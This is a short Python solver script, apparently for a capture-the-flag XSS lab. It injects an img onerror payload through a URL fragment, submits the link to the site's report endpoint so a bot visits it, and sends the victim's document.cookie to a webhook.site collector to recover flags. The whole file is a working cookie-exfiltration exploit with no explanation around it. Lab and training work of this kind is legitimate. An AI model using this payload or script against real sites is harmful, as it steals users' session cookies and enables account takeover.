import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

import urllib.parse

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        BASE_URL = "https://xss-playground-3.quoccacorp.com"

        PAYLOAD = f'''<img src="x" onerror="fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)">'''
        url_encoded_payload = urllib.parse.quote(PAYLOAD)

        report_url_payload = f"{BASE_URL}/#{url_encoded_payload}"
        self.session.post(f"{BASE_URL}/report", data={"url": report_url_payload})
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
